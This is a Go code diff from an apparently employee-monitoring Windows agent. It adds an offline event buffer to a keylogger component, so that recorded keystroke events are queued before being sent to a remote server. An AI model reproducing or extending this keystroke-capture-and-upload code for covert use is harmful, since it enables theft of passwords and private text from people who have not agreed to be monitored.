@@ -5,6 +5,7 @@ package monitoring
 
 import (
 	"bytes"
+	"context"
 	"encoding/json"
 	"fmt"
 	"log"
@@ -15,6 +16,7 @@ import (
 	"time"
 	"unsafe"
 
+	"github.com/ctolnik/Office-Monitor/agent/buffer"
 	"golang.org/x/sys/windows"
 )
 
@@ -70,6 +72,7 @@ type Keylogger struct {
 	mu                 sync.RWMutex
 	currentBuffer      *KeylogBuffer
 	client             *http.Client
+	eventBuffer        *buffer.EventBuffer
 }
 
 type KeylogBuffer struct {
@@ -93,7 +96,7 @@ type KeylogEvent struct {
 
 var globalKeylogger *Keylogger
 
-func NewKeylogger(serverURL, computerName, username string, monitoredProcesses []string, bufferSizeChars, sendIntervalMin int) *Keylogger {
+func NewKeylogger(serverURL, computerName, username string, monitoredProcesses []string, bufferSizeChars, sendIntervalMin int, eventBuffer *buffer.EventBuffer) *Keylogger {
 	procMap := make(map[string]bool)
 	for _, proc := range monitoredProcesses {
 		procMap[strings.ToLower(proc)] = true
@@ -113,6 +116,7 @@ func NewKeylogger(serverURL, computerName, username string, monitoredProcesses [
 		currentBuffer: &KeylogBuffer{
 			StartTime: time.Now(),
 		},
+		eventBuffer: eventBuffer,
 	}
 
 	globalKeylogger = k
@@ -422,6 +426,12 @@ func (k *Keylogger) flushBuffer() {
 }
 
 func (k *Keylogger) sendEvent(event KeylogEvent) error {
+	// Use buffer if available (offline-ready)
+	if k.eventBuffer != nil {
+		return k.eventBuffer.Add("keyboard", event)
+	}
+
+	// Fallback to direct send
 	data, err := json.Marshal(event)
 	if err != nil {
 		return err
